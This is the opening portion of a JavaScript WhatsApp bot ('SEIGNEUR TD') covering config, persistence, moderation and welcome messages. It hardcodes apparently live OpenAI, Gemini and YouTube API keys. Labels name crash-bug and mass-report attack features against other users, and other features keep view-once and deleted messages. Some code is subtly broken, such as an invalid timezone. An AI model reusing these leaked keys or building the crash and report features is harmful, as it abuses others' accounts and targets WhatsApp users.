import { handleSuperAdmin, isSuperAdminJid } from './superadmin.js';
import makeWASocket, {
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  delay,
  downloadContentFromMessage
} from '@whiskeysockets/baileys';
import qrcode from 'qrcode-terminal';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import * as cheerio from 'cheerio';

// Bot configuration
const config = {
  botName: 'SEIGNEUR TD 🇷🇴',
  prefix: '!',
  language: 'ar', // 'ar' = Arabe, 'fr' = Français, 'en' = English
  autoReply: false,
  sessionFolder: './auth_info_baileys',
  usePairingCode: true,
  phoneNumber: '', // Format: '33612345678'
  adminNumbers: ['23591234568'], // Admins
  botAdmins: ['23591234568'], // Liste des numéros admin (sans @s.whatsapp.net)
  dataFolder: './bot_data',
  maxViewOncePerUser: 50,
  commandCooldown: 2000, // 2 secondes entre les commandes
  youtubeApiKey: 'AIzaSyD3JA07YzY6SJSHKtj9IA7S-GFZUkqYd70', // 🔑 Clé API YouTube Data v3
  openaiApiKey:  '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', // 🔑 Clé API OpenAI GPT
  geminiApiKey:  'AIzaSyAj5kNv4ClFt-4DskW6XDU0PIPd3PXmwCw',  // 🔑 Clé API Google Gemini
  groqApiKey:    '',  // 🔑 Clé API Groq (optionnel, gratuit sur console.groq.com)
  channelLink:   'https://whatsapp.com/channel/0029VbBZrLBFMqrQIDpcfO04',  // 📢 Chaîne WhatsApp
  channelJid:    '120363422398514286@newsletter'
};

// Créer le dossier de données s'il n'existe pas
if (!fs.existsSync(config.dataFolder)) {
  fs.mkdirSync(config.dataFolder, { recursive: true });
}

// =============================================
// SYSTÈME DE TRADUCTION ARABE
// =============================================

const translations = {
  // Messages communs
  'Admins seulement': 'Admins seulement',
  'This command is for groups only': 'Commande pour groupes seulement',
  'Admin command': 'Commande réservée aux admins',
  'Usage': 'Utilisation',
  'Exemple': 'Exemple',
  'Erreur': 'Erreur',
  'Succès': 'Succès',
  'Failed': 'Échec',
  'Chargement...': 'Chargement...',
  'Veuillez patienter': 'Veuillez patienter',
  'Terminé': 'Terminé',
  'Target': 'Cible',
  'Status': 'Statut',
  
  // Commandes principales
  'Menu': 'Menu',
  'Help': 'Aide',
  'Ping': 'Ping',
  'Alive': 'Actif',
  'Info': 'Infos',
  'Status': 'Statut',
  
  // Messages du menu
  'User': 'Utilisateur',
  'Dev': 'Développeur',
  'Developer': 'Développeur',
  'Region': 'Région',
  'Date': 'Date',
  'Time': 'Heure',
  'Mode': 'Mode',
  'Version': 'Version',
  'Prefix': 'Préfixe',
  'Bot Name': 'Nom du bot',
  
  // Commandes de groupe
  'Group': 'Groupe',
  'Members': 'Membres',
  'Admins': 'Admins',
  'Online': 'Connecté',
  'Offline': 'Déconnecté',
  'Kicked': 'Expulsé',
  'Added': 'Ajouté',
  'Promoted': 'Promu',
  'Demoted': 'Rétrogradé',
  
  // Messages d'erreur
  'No media found': 'Aucun média trouvé',
  'Reply to a message': 'Réponds à un message',
  'Mentionne quelqu\'un': 'Mentionne quelqu\'un',
  'Invalid number': 'Numéro invalide',
  'Command not found': 'Commande introuvable',
  
  // Bugs et attaques
  'KILL.GC BUG': 'Bug expulsion groupe',
  'IOS.KILL BUG': 'Bug crash iOS',
  'ANDRO.KILL BUG': 'Bug crash Android',
  'SILENT REPORT': 'Signalement silencieux',
  'BAN SUPPORT': 'Support ban',
  'MEGA BAN': 'Mega ban',
  
  // États
  'Envoyé': 'Envoyé',
  'Livré': 'Livré',
  'Exécuté': 'Exécuté',
  'Terminé': 'Terminé',
  'Publié': 'Publié',
  'Banni': 'Banni',
  'Spam': 'Spam',
  'Propre': 'Propre',
  'Suspect': 'Suspect',
  
  // Autres
  'Payload': 'Payload',
  'Reports': 'Signalements',
  'Total': 'Total',
  'Duration': 'Durée',
  'Speed': 'Vitesse',
  'Risk': 'Risques',
  'Timeline': 'Calendrier',
  'Details': 'Détails',
  'System Status': 'État du système',
  'Base de données synchronisée': 'Base de données synchronisée',
  'Mission accomplished': 'Mission accomplie'
};

// Fonction de traduction
function translate(text) {
  if (config.language !== 'ar') return text;
  
  // Traduire les mots clés
  let translatedText = text;
  for (const [key, value] of Object.entries(translations)) {
    const regex = new RegExp(key, 'gi');
    translatedText = translatedText.replace(regex, value);
  }
  
  return translatedText;
}

// Fonction pour envelopper les messages en arabe
function msg(text) {
  return translate(text);
}

// Auto-reply keywords and responses
const autoReplies = {
  'hello': '👋 Salut! Je suis SEIGNEUR TD 🇷🇴. Comment puis-je t\'aider?',
  'hi': '👋 Hello! Bienvenue sur SEIGNEUR TD 🇷🇴.',
  'help': `╔══════════════════════════════╗
║      SEIGNEUR TD 🇷🇴         ║
╚══════════════════════════════╝

📋 Commandes disponibles:
━━━━━━━━━━━━━━━━
!help - Afficher ce menu
!ping - Vérifier la latence
!info - Informations du bot
!menu - Menu principal

Type !menu pour voir le menu complet!`,
  'bye': '👋 À bientôt! Prends soin de toi!',
  'thanks': 'De rien! 😊 - SEIGNEUR TD 🇷🇴',
  'thank you': 'Avec plaisir! 😊 - SEIGNEUR TD 🇷🇴'
};

// Simple in-memory database with persistence
const database = {
  users: new Map(),
  groups: new Map(),
  statistics: {
    totalMessages: 0,
    totalUsers: 0,
    totalGroups: 0
  }
};

// Variables pour les fonctionnalités
let botMode = 'public';
let autoTyping = false;
let autoRecording = true;
let autoReact = true;
let autoReadStatus = true;
let autoLikeStatus = true;
let antiDelete = true;
let antiEdit = true;
let antiDeleteMode = 'all'; // 'private' | 'gchat' | 'all'
let antiEditMode = 'all';   // 'private' | 'gchat' | 'all'
let antiBug = true; // ✅ Anti-Bug activé par défaut
let chatbotEnabled = false; // 🤖 Chatbot SEIGNEUR TD OFF par défaut
let stickerPackname = 'SEIGNEUR TD 🇷🇴'; // 📦 Nom du pack sticker
let stickerAuthor = 'SEIGNEUR TD 🇷🇴'; // ✍️ Auteur du sticker
let menuStyle = 1; // 🎨 Style de menu (1, 2, 3)
let savedViewOnce = new Map();
let messageCache = new Map();
let groupSettings = new Map();
let memberActivity = new Map();

// 🛡️ Anti-Bug: tracker des attaques détectées
const antiBugTracker = new Map(); // { senderJid: { count, lastSeen, blocked } }

let autoreactWords = {
  'good': '👍', 'nice': '👌', 'wow': '😲',
  'lol': '😂', 'cool': '😎', 'love': '❤️',
  'fire': '🔥', 'sad': '😢', 'angry': '😠', 'ok': '👌'
};

const warnSystem = new Map();
const spamTracker = new Map();
const permaBanList = new Map();
const commandCooldowns = new Map();

// =============================================
// 🗄️ STORE LOCAL - SYSTÈME DE PERSISTANCE COMPLET
// =============================================

const STORE_DIR = './store';
const STORE_FILES = {
  config:       `${STORE_DIR}/config.json`,
  admins:       `${STORE_DIR}/admins.json`,
  warns:        `${STORE_DIR}/warns.json`,
  permabans:    `${STORE_DIR}/permabans.json`,
  groupSettings:`${STORE_DIR}/group_settings.json`,
  stats:        `${STORE_DIR}/stats.json`,
  viewonce:     `${STORE_DIR}/viewonce.json`,
  activity:     `${STORE_DIR}/activity.json`,
  antilink:     `${STORE_DIR}/antilink.json`,
  antibot:      `${STORE_DIR}/antibot.json`,
  antitag:      `${STORE_DIR}/antitag.json`,
  antispam:     `${STORE_DIR}/antispam.json`,
  welcome:      `${STORE_DIR}/welcome.json`,
  autoreact:    `${STORE_DIR}/autoreact.json`,
};

// --- Utilitaires Store ---
function storeEnsureDir() {
  if (!fs.existsSync(STORE_DIR)) {
    fs.mkdirSync(STORE_DIR, { recursive: true });
    console.log('📁 Store directory created:', STORE_DIR);
  }
  // Créer aussi le dossier legacy pour compatibilité
  if (!fs.existsSync(config.dataFolder)) {
    fs.mkdirSync(config.dataFolder, { recursive: true });
  }
}

function storeRead(file, defaultValue = {}) {
  try {
    if (fs.existsSync(file)) {
      const raw = fs.readFileSync(file, 'utf8');
      return JSON.parse(raw);
    }
  } catch (e) {
    console.error(`⚠️ Store read error [${file}]:`, e.message);
  }
  return defaultValue;
}

function storeWrite(file, data) {
  try {
    storeEnsureDir();
    fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
    return true;
  } catch (e) {
    console.error(`⚠️ Store write error [${file}]:`, e.message);
    return false;
  }
}

function mapToObj(map) {
  const obj = {};
  for (const [k, v] of map.entries()) obj[k] = v;
  return obj;
}

function objToMap(obj) {
  return new Map(Object.entries(obj || {}));
}

// --- LOAD STORE (au démarrage) ---
function loadStore() {
  storeEnsureDir();

  // 1. CONFIG (botMode, toggles)
  const savedConfig = storeRead(STORE_FILES.config);
  if (Object.keys(savedConfig).length) {
    botMode        = 'public'; // Toujours démarrer en mode public
    autoTyping     = savedConfig.autoTyping     ?? false;
    autoRecording  = savedConfig.autoRecording  ?? true;
    autoReact      = savedConfig.autoReact      ?? true;
    autoReadStatus = savedConfig.autoReadStatus ?? true;
    autoLikeStatus = savedConfig.autoLikeStatus ?? true;
    antiDelete     = savedConfig.antiDelete     ?? true;
    antiEdit       = savedConfig.antiEdit       ?? true;
    antiDeleteMode = savedConfig.antiDeleteMode ?? 'all';
    antiEditMode   = savedConfig.antiEditMode   ?? 'all';
    antiBug        = savedConfig.antiBug        ?? true;
    chatbotEnabled = savedConfig.chatbotEnabled ?? false;
    autoreactWords = savedConfig.autoreactWords ?? autoreactWords;
    stickerPackname = savedConfig.stickerPackname ?? 'SEIGNEUR TD 🇷🇴';
    stickerAuthor   = savedConfig.stickerAuthor   ?? 'SEIGNEUR TD 🇷🇴';
    menuStyle       = savedConfig.menuStyle        ?? 1;
    console.log('✅ [STORE] Config chargée');
  }

  // 2. ADMINS — toujours utiliser la config du fichier index.js
  // (store ignoré pour éviter d'écraser le numéro owner)
  console.log(`✅ [STORE] Admins depuis config: ${config.botAdmins}`);

  // 3. WARNS
  const savedWarns = storeRead(STORE_FILES.warns);
  for (const [k, v] of Object.entries(savedWarns)) warnSystem.set(k, v);
  if (Object.keys(savedWarns).length) console.log('✅ [STORE] Warnings chargés');

  // 4. PERMABANS
  const savedBans = storeRead(STORE_FILES.permabans);
  for (const [k, v] of Object.entries(savedBans)) permaBanList.set(k, v);
  if (Object.keys(savedBans).length) console.log('✅ [STORE] Permabans chargés');

  // 5. GROUP SETTINGS
  const savedGroups = storeRead(STORE_FILES.groupSettings);
  for (const [k, v] of Object.entries(savedGroups)) groupSettings.set(k, v);
  if (Object.keys(savedGroups).length) console.log('✅ [STORE] Paramètres groupes chargés');

  // 6. STATS
  const savedStats = storeRead(STORE_FILES.stats);
  if (Object.keys(savedStats).length) {
    Object.assign(database.statistics, savedStats);
    console.log('✅ [STORE] Statistiques chargées');
  }

  // 7. VIEW ONCE
  const savedVV = storeRead(STORE_FILES.viewonce);
  for (const [k, v] of Object.entries(savedVV)) {
    try {
      savedViewOnce.set(k, v.map(item => ({
        ...item,
        buffer: Buffer.from(item.buffer, 'base64')
      })));
    } catch(e) {}
  }
  if (Object.keys(savedVV).length) console.log('✅ [STORE] View Once chargé');

  // 8. ACTIVITY
  const savedActivity = storeRead(STORE_FILES.activity);
  for (const [groupJid, members] of Object.entries(savedActivity)) {
    memberActivity.set(groupJid, objToMap(members));
  }
  if (Object.keys(savedActivity).length) console.log('✅ [STORE] Activité chargée');

  console.log('🗄️ [STORE] Loading complet!');
}

// --- SAVE STORE (complet) ---
function saveStore() {
  storeEnsureDir();

  // 1. CONFIG
  storeWrite(STORE_FILES.config, {
    botMode, autoTyping, autoRecording, autoReact,
    autoReadStatus, autoLikeStatus, antiDelete, antiEdit, antiDeleteMode, antiEditMode, antiBug, chatbotEnabled, autoreactWords,
    stickerPackname, stickerAuthor, menuStyle,
    savedAt: new Date().toISOString()
  });

  // 2. ADMINS
  storeWrite(STORE_FILES.admins, {
    botAdmins: config.botAdmins,
    adminNumbers: config.adminNumbers,
    savedAt: new Date().toISOString()
  });

  // 3. WARNS
  storeWrite(STORE_FILES.warns, mapToObj(warnSystem));

  // 4. PERMABANS
  storeWrite(STORE_FILES.permabans, mapToObj(permaBanList));

  // 5. GROUP SETTINGS
  storeWrite(STORE_FILES.groupSettings, mapToObj(groupSettings));

  // 6. STATS
  storeWrite(STORE_FILES.stats, {
    ...database.statistics,
    savedAt: new Date().toISOString()
  });

  // 7. VIEW ONCE
  const vvData = {};
  for (const [k, v] of savedViewOnce.entries()) {
    try {
      vvData[k] = v.map(item => ({
        ...item,
        buffer: Buffer.isBuffer(item.buffer) ? item.buffer.toString('base64') : item.buffer
      }));
    } catch(e) {}
  }
  storeWrite(STORE_FILES.viewonce, vvData);

  // 8. ACTIVITY
  const activityData = {};
  for (const [groupJid, membersMap] of memberActivity.entries()) {
    activityData[groupJid] = mapToObj(membersMap);
  }
  storeWrite(STORE_FILES.activity, activityData);
}

// --- SAVE PARTIEL (une seule clé) ---
function saveStoreKey(key) {
  switch(key) {
    case 'config':
      storeWrite(STORE_FILES.config, {
        botMode, autoTyping, autoRecording, autoReact,
        autoReadStatus, autoLikeStatus, antiDelete, antiEdit, autoreactWords,
        savedAt: new Date().toISOString()
      });
      break;
    case 'admins':
      storeWrite(STORE_FILES.admins, {
        botAdmins: config.botAdmins,
        adminNumbers: config.adminNumbers,
        savedAt: new Date().toISOString()
      });
      break;
    case 'warns':
      storeWrite(STORE_FILES.warns, mapToObj(warnSystem));
      break;
    case 'permabans':
      storeWrite(STORE_FILES.permabans, mapToObj(permaBanList));
      break;
    case 'groupSettings':
      storeWrite(STORE_FILES.groupSettings, mapToObj(groupSettings));
      break;
    case 'stats':
      storeWrite(STORE_FILES.stats, { ...database.statistics, savedAt: new Date().toISOString() });
      break;
    case 'viewonce':
      const vvData = {};
      for (const [k, v] of savedViewOnce.entries()) {
        try {
          vvData[k] = v.map(item => ({
            ...item,
            buffer: Buffer.isBuffer(item.buffer) ? item.buffer.toString('base64') : item.buffer
          }));
        } catch(e) {}
      }
      storeWrite(STORE_FILES.viewonce, vvData);
      break;
    case 'activity':
      const actData = {};
      for (const [g, m] of memberActivity.entries()) actData[g] = mapToObj(m);
      storeWrite(STORE_FILES.activity, actData);
      break;
  }
}

// --- STORE STATUS (pour !storestatus) ---
function getStoreStatus() {
  const files = [];
  let totalSize = 0;
  for (const [key, filePath] of Object.entries(STORE_FILES)) {
    if (fs.existsSync(filePath)) {
      const stat = fs.statSync(filePath);
      const sizeKB = (stat.size / 1024).toFixed(2);
      totalSize += stat.size;
      files.push({ key, sizeKB, modified: stat.mtime.toLocaleTimeString('ar-SA') });
    } else {
      files.push({ key, sizeKB: '0.00', modified: 'Pas encore créé' });
    }
  }
  return { files, totalSizeKB: (totalSize / 1024).toFixed(2) };
}

// Auto-save toutes les 3 minutes
setInterval(() => {
  saveStore();
  console.log('💾 [STORE] Auto-save effectué');
}, 3 * 60 * 1000);

// Compatibilité with les anciens appels loadData/saveData
function loadData() { loadStore(); }
function saveData() { saveStore(); }


// =============================================
// UTILITAIRES
// =============================================

// ─── HELPER: Audio thème du bot (fichier local menu.mp3) ────────────────────
// Envoie menu.mp3 avec le même format que !playaudio
async function sendCmdAudio(sock, remoteJid) {
  // Audio désactivé
  return false;
}


// ─── HELPER: Ajouter footer chaîne après les réponses ────────────────────────
async function sendWithChannelFooter(sock, remoteJid, text, options = {}) {
  const footerText = text + `\n\n📢 *Rejoins notre chaîne:* ${config.channelLink}`;
  await sock.sendMessage(remoteJid, { text: footerText, ...options });
}

// ═══ Helper: Envoyer réponse + lien chaîne + audio ═══════════════════════════


async function toBuffer(stream) {
  const chunks = [];
  for await (const chunk of stream) {
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}

// Note: La logique du super admin est dans superadmin.js
// isSuperAdminJid() est importé depuis superadmin.js

function isAdmin(jid) {
  if (!jid) return false;
  // Extract digits only from jid (strip @s.whatsapp.net and :XX device suffix)
  const numOnly = jid.replace(/@.*/, '').replace(/:[0-9]+$/, '').replace(/[^0-9]/g, '');
  const adminList = [...(config.adminNumbers || []), ...(config.botAdmins || [])];
  const result = adminList.some(a => {
    const aNum = String(a).replace(/[^0-9]/g, '');
    return numOnly === aNum;
  });
  console.log(`[ADMIN] jid=${jid} | numOnly=${numOnly} | admins=${JSON.stringify(adminList)} | result=${result}`);
  return result;
}

// isSuperAdmin() remplacé par isSuperAdminJid() importé depuis superadmin.js

// Le numéro connecté au bot (fromMe = true) est TOUJOURS admin
// _currentFromMe est mis à true quand le message vient du numéro connecté au bot
let _currentFromMe = false;
let _currentSenderJid = '';
let _origSendMessageGlobal = null; // stocké globalement pour swgrup et autres
let _botFirstConnect = true; // auto-restart à la première connexion
let _botOwnNumber = ''; // numéro du bot connecté (rempli au moment de la connexion)

function isBotOwner() {
  return _currentFromMe;
}

// isAdminOrOwner() = true si :
//   - message.key.fromMe (numéro connecté au bot)
//   - OU senderJid est dans adminNumbers/botAdmins
//   - OU senderJid est le super admin
function isAdminOrOwner() {
  if (_currentFromMe) return true;
  // Comparer senderJid avec le numéro du bot connecté (fromMe pas toujours fiable en groupe)
  if (_botOwnNumber) {
    const _n = (_currentSenderJid||'').replace(/@.*/,'').replace(/:[0-9]+$/,'').replace(/[^0-9]/g,'');
    if (_n === _botOwnNumber) return true;
  }
  return isAdmin(_currentSenderJid) || isSuperAdminJid(_currentSenderJid);
}

// Vérifier si un utilisateur est admin du groupe
async function isGroupAdmin(sock, groupJid, userJid) {
  try {
    // Le numéro du bot est TOUJOURS admin
    const botJid = sock.user.id.split(':')[0];
    const normalizedUserJid = userJid.split(':')[0];
    
    if (normalizedUserJid === botJid) {
      return true; // Le bot est toujours admin
    }
    
    const metadata = await sock.groupMetadata(groupJid);
    const participant = metadata.participants.find(p => {
      const normalizedPJid = p.id.split(':')[0];
      return normalizedPJid === normalizedUserJid;
    });
    return participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
  } catch (error) {
    console.error('Erreur che... grp admin:', error);
    return false;
  }
}

// Vérifier si le bot est admin du groupe
async function isBotGroupAdmin(sock, groupJid) {
  // LE BOT EST TOUJOURS ADMIN - Retourne toujours true
  return true;
  
  /* Code original commenté - Le bot n'a plus besoin d'être réellement admin
  try {
    const metadata = await sock.groupMetadata(groupJid);
    const botJid = sock.user.id.split(':')[0];
    const participant = metadata.participants.find(p => p.id.split(':')[0] === botJid);
    return participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
  } catch (error) {
    console.error('Erreur checking bot admin:', error);
    return false;
  }
  */
}

function checkCooldown(userId, commandName) {
  const key = `${userId}-${commandName}`;
  const now = Date.now();
  
  if (commandCooldowns.has(key)) {
    const lastUse = commandCooldowns.get(key);
    if (now - lastUse < config.commandCooldown) {
      return false;
    }
  }
  
  commandCooldowns.set(key, now);
  return true;
}

async function simulateTyping(sock, jid, duration = 3000) {
  if (!autoTyping) return;
  try {
    await sock.sendPresenceUpdate('composing', jid);
    setTimeout(async () => {
      try { await sock.sendPresenceUpdate('available', jid); } catch(e) {}
    }, duration);
  } catch(e) {
    console.error('Autotype error:', e.message);
  }
}

async function simulateRecording(sock, jid, duration = 2000) {
  if (!autoRecording) return;
  try {
    await sock.sendPresenceUpdate('recording', jid);
    setTimeout(async () => {
      try { await sock.sendPresenceUpdate('available', jid); } catch(e) {}
    }, duration);
  } catch(e) {
    console.error('Autorecord error:', e.message);
  }
}

// Initialiser les paramètres d'un groupe
function initGroupSettings(groupJid) {
  if (!groupSettings.has(groupJid)) {
    groupSettings.set(groupJid, {
      antilink: false,
      antibot: false,
      antitag: false,
      antispam: false,
      maxWarns: 3
    });
    saveStoreKey('groupSettings'); // 💾 Sauvegarde partielle
  }
  return groupSettings.get(groupJid);
}

// =============================================
// SYSTÈME D'AVERTISSEMENTS
// =============================================

function addWarn(groupJid, userJid, reason) {
  const key = `${groupJid}-${userJid}`;
  if (!warnSystem.has(key)) {
    warnSystem.set(key, []);
  }
  
  const warns = warnSystem.get(key);
  warns.push({
    reason: reason,
    timestamp: Date.now()
  });
  
  saveStoreKey('warns'); // 💾 Sauvegarde partielle immédiate
  return warns.length;
}

function getWarns(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  return warnSystem.get(key) || [];
}

function resetWarns(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  warnSystem.delete(key);
  saveStoreKey('warns'); // 💾 Sauvegarde partielle immédiate
}

// =============================================
// SYSTÈME DE PERMABAN
// =============================================

function addPermaBan(groupJid, userJid, reason, bannedBy) {
  const key = `${groupJid}-${userJid}`;
  permaBanList.set(key, {
    userJid: userJid,
    groupJid: groupJid,
    reason: reason,
    bannedBy: bannedBy,
    timestamp: Date.now()
  });
  saveStoreKey('permabans'); // 💾 Sauvegarde partielle immédiate
}

function isPermaBanned(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  return permaBanList.has(key);
}

function removePermaBan(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  permaBanList.delete(key);
  saveData();
}

function getPermaBanInfo(groupJid, userJid) {
  const key = `${groupJid}-${userJid}`;
  return permaBanList.get(key);
}

function getAllPermaBans(groupJid) {
  const bans = [];
  for (const [key, value] of permaBanList.entries()) {
    if (value.groupJid === groupJid) {
      bans.push(value);
    }
  }
  return bans;
}

// =============================================
// DÉTECTION ANTI-Spam
// =============================================

function checkSpam(userJid, message) {
  const now = Date.now();
  const key = userJid;
  
  if (!spamTracker.has(key)) {
    spamTracker.set(key, []);
  }
  
  const userMessages = spamTracker.get(key);
  const recentMessages = userMessages.filter(msg => now - msg.time < 5000);
  recentMessages.push({ time: now, text: message });
  spamTracker.set(key, recentMessages);
  
  if (recentMessages.length > 5) {
    return true;
  }
  
  const textCounts = {};
  recentMessages.forEach(msg => {
    textCounts[msg.text] = (textCounts[msg.text] || 0) + 1;
  });
  
  if (Object.values(textCounts).some(count => count >= 3)) {
    return true;
  }
  
  return false;
}

// Fonction pour obtenir la région à partir du timezone
function getRegionFromTimezone() {
  // Toujours retourner NDjamena, Tchad
  return 'NDjamena, Tchad 🇹🇩';
}

// Fonction pour initialiser/obtenir les paramètres d'un groupe
function getGroupSettings(groupJid) {
  if (!groupSettings.has(groupJid)) {
    groupSettings.set(groupJid, {
      welcome: false,
      goodbye: false
    });
  }
  return groupSettings.get(groupJid);
}

// Fonction pour envoyer le message de bienvenue
async function sendWelcomeMessage(sock, groupJid, newMemberJid) {
  try {
    const metadata = await sock.groupMetadata(groupJid);
    const groupName = metadata.subject;
    const memberCount = metadata.participants.length;
    
    // Trouver le superadmin (créateur du groupe)
    const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
    
    // Liste des admins
    const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    let adminList = '';
    admins.forEach((admin, index) => {
      if (admin.id !== superadmin) {
        adminList += `└─ ${index + 1}. @${admin.id.split('@')[0]}\n`;
      }
    });
    if (!adminList) adminList = '└─ Aucun admin supplémentaire';
    
    // Date et heure (timezone Tchad)
    const now = new Date();
    const dateStr = now.toLocaleDateString('fr-FR', {
      timeZone: 'America/NDjamena',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric'
    });
    const timeStr = now.toLocaleTimeString('fr-FR', {
      timeZone: 'America/NDjamena',
      hour: '2-digit',
      minute: '2-digit'
    });
    
    const welcomeText = ` ┏━━━━━ ✨ ᴡᴇʟᴄᴏᴍᴇ ✨ ━━━━━┓
👤 𝐍𝐎𝐔𝐕𝐄𝐀𝐔 𝐌𝐄𝐌𝐁𝐑𝐄 : @${newMemberJid.split('@')[0]}
👋 Bienvenue parmi nous !

◈ 𝖦𝗋𝗈𝗎𝗉𝖾 : ${groupName}
◈ 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 : ${memberCount}

📅 𝖣𝖺𝗍𝖾 : ${dateStr}
🕙 𝖧𝖾𝗎𝗋𝖾 : ${timeStr}
┗━━━━━━━━━━━━━━━━━━━━━━┛

👑 𝗦𝗨𝗣𝗘𝗥𝗔𝗗𝗠𝗜𝗡 (𝖢𝗋𝖾́𝖺𝗍𝖾𝗎𝗋) :
└─ @${superadmin.split('@')[0]}

👮‍♂️ 𝗟𝗜𝗦𝗧𝗘 𝗗𝗘𝗦 𝗔𝗗𝗠𝗜𝗡𝗦 :
${adminList}

📜 𝗥𝗘̀𝗚𝗟𝗘𝗦 𝗗𝗨 𝗚𝗥𝗢𝗨𝗣𝗘 :
𝖯𝗈𝗎𝗋 𝗀𝖺𝗋𝖽𝖾𝗋 𝗎𝗇𝖾 𝖺𝗆𝖻𝗂𝖺𝗇𝖼𝖾 𝗌𝖺𝗂𝗇𝖾 :
⛔ 𝟏. 𝖯𝖺𝗌 𝖽𝖾 𝖲𝗉𝖺𝗆
⚠️ 𝟐. 𝖯𝖺𝗌 𝖽𝖾 𝖯𝗎𝖻 / 𝖫𝗂𝖾𝗇𝗌
🤝 𝟑. 𝖱𝖾𝗌𝗉𝖾𝖼𝗍 𝖬𝗎𝗍𝗎𝖾𝗅
🔞 𝟒. 𝖢𝗈𝗇𝗍𝖾𝗇𝗎 𝖠𝗉𝗉𝗋𝗈𝗉𝗋𝗂𝖾́

💡 𝘓𝘦 𝘯𝘰𝘯-𝘳𝘦𝘴𝘱𝘦𝘤𝘵 𝘥𝘦𝘴 𝘳𝘦̀𝘨𝘭𝘦𝘴 𝘱𝘦𝘶𝘵
𝘦𝘯𝘵𝘳𝘢𝘪̂𝘯𝘦𝘳 𝘶𝘯 𝘣𝘢𝘯𝘯𝘪𝘴𝘴𝘦𝘮𝘦𝘯𝘵.

✨ 𝖯𝗋𝗈𝖿𝗂𝗍𝖾 𝖻𝗂𝖾𝗇 𝖽𝖾 𝗅𝖺 𝖼𝗈𝗆𝗆𝗎𝗇𝖺𝗎𝗍𝖾́ !
━━━━━━━━━━━━━━━━━━━━━`;

    const mentions = [newMemberJid, superadmin, ...admins.map(a => a.id)];
    
    await sock.sendMessage(groupJid, {
      text: welcomeText,
      mentions: mentions
    });
    
    console.log(`✅ Message de bienvenue envoyé à ${newMemberJid.split('@')[0]}`);
  } catch (error) {
    console.error('Erreur in sendWelcomeMessage:', error);
  }
}

// Fonction pour envoyer le message d'au revoir
async function sendGoodbyeMessage(sock, groupJid, leftMemberJid) {
  try {
    const metadata = await sock.groupMetadata(groupJid);
    const groupName = metadata.subject;
    const memberCount = metadata.participants.length;
    
    // Trouver le superadmin
    const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
    
    // Liste des admins
    const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    let adminList = '';
    admins.forEach((admin, index) => {
      if (admin.id !== superadmin) {
        adminList += `└─ ${index + 1}. @${admin.id.split('@')[0]}\n`;
      }
    });
    if (!adminList) adminList = '└─ Aucun admin supplémentaire';
    
    // Date et heure
    const now = new Date();
    const dateStr = now.toLocaleDateString('fr-FR', {
      timeZone: 'America/NDjamena',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric'
    });
    const timeStr = now.toLocaleTimeString('fr-FR', {
      timeZone: 'America/NDjamena',
      hour: '2-digit',
      minute: '2-digit'
    });
    
    const goodbyeText = `┏━━━ 💨 ɢᴏᴏᴅʙʏᴇ ━━━┓

  ◈ 𝖦𝗋𝗈𝗎𝗉𝖾 : ${groupName}
  ◈ 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 : ${memberCount} 
  
  📅 𝖣𝖺𝗍𝖾 : ${dateStr}
  🕙 𝖧𝖾𝗎𝗋𝖾 : ${timeStr}

┗━━━━━━━━━━━━━━━━━━━━┛

👋 𝗨𝗡 𝗠𝗘𝗠𝗕𝗥𝗘 𝗡𝗢𝗨𝗦 𝗤𝗨𝗜𝗧𝗧𝗘 :
└─ @${leftMemberJid.split('@')[0]}

👑 𝗦𝗨𝗣𝗘𝗥𝗔𝗗𝗠𝗜𝗡 :
└─ @${superadmin.split('@')[0]}

👮‍♂️ 𝗦𝗧𝗔𝗙𝗙 𝗔𝗗𝗠𝗜𝗡𝗦 :
${adminList}

📜 𝗜𝗡𝗙𝗢 :
𝖴𝗇𝖾 𝗉𝖾𝗋𝗌𝗈𝗇𝗇𝖾 𝖺 𝗊𝗎𝗂𝗍𝗍𝖾́ 𝗅'𝖺𝗏𝖾𝗇𝗍𝗎𝗋𝖾. 
𝖫𝖾 𝗀𝗋𝗈𝗎𝗉𝖾 𝖼𝗈𝗆𝗉𝗍𝖾 𝖽𝖾́𝗌𝗈𝗋𝗆𝖺𝗂𝗌 ${memberCount} 
𝗉𝖺𝗋𝗍𝗂𝖼𝗂𝗉𝖺𝗇𝗍𝗌.

💡 𝘙𝘢𝘱𝘱𝘦𝘭 : 𝘛𝘰𝘶𝘵𝘦 𝘦𝘹𝘤𝘭𝘶𝘴𝘪𝘰𝘯 𝘱𝘢𝘳 𝘭𝘦 𝘴𝘵𝘢𝘧𝘧 
𝘦𝘴𝘵 𝘥𝘦́𝘧𝘪𝘯𝘪𝘵𝘪𝘷𝘦 𝘴𝘢𝘶𝘧 𝘢𝘱𝘱𝘦𝘭 𝘢𝘶𝘱𝘳𝘦̀𝘴 𝘥'𝘶𝘯 𝘢𝘥𝘮𝘪𝘯.

━━━━━━━━━━━━━━━━━━━━
👋 𝖠𝗎 𝗉𝗅𝖺𝗂𝗌𝗂𝗋 𝖽𝖾 𝗍𝖾 𝗋𝖾𝗏𝗈𝗂𝗋 !`;

    const mentions = [leftMemberJid, superadmin, ...admins.map(a => a.id)];
    
    await sock.sendMessage(groupJid, {
      text: goodbyeText,
      mentions: mentions
    });
    
    console.log(`✅ Message d'au revoir envoyé pour ${leftMemberJid.split('@')[0]}`);
  } catch (error) {
    console.error('Erreur in send Gdby.. Msg:', error);
  }
}

// =============================================
// CONNEXION WHATSAPP
// =============================================

async function connectToWhatsApp() {
  loadData();

  const { version, isLatest } = await fetchLatestBaileysVersion();
